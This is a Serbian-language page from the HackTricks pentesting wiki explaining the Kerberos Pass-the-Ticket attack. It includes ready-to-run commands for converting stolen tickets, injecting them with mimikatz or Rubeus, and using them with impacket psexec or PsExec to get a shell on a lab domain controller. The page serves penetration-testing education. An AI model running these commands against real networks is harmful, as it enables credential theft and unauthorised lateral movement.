# Pass the Ticket

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=pass-the-ticket) za lako kreiranje i **automatizaciju radnih tokova** pokretanih **najnaprednijim** alatima zajednice na svetu.\
Pribavite pristup danas:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=pass-the-ticket" %}

## Pass The Ticket (PTT)

U metodi napada **Pass The Ticket (PTT)**, napadači **kradu autentifikacionu kartu korisnika** umesto njihove lozinke ili heš vrednosti. Ova ukradena karta se zatim koristi za **improvizaciju korisnika**, sticanje neovlašćenog pristupa resursima i uslugama unutar mreže.

**Pročitajte**:

- [Berba karata sa Windows-a](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [Berba karata sa Linux-a](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

### **Zamena Linux i Windows karata između platformi**

Alat [**ticket_converter**](https://github.com/Zer1t0/ticket_converter) konvertuje formate karata koristeći samo kartu i izlaznu datoteku.
```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
Converting ccache => kirbi

python ticket_converter.py velociraptor.kirbi velociraptor.ccache
Converting kirbi => ccache
```
U Windows-u [Kekeo](https://github.com/gentilkiwi/kekeo) može se koristiti.

### Napad Pass The Ticket
```bash:Linux
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```

```bash:Windows
#Load the ticket in memory using mimikatz or Rubeus
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi
klist #List tickets in cache to cehck that mimikatz has loaded the ticket
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```
## Reference

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=pass-the-ticket) za lako kreiranje i **automatizaciju radnih tokova** pokretanih **najnaprednijim** alatima zajednice na svetu.\
Pribavite pristup danas:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=pass-the-ticket" %}

{{#include ../../banners/hacktricks-training.md}}
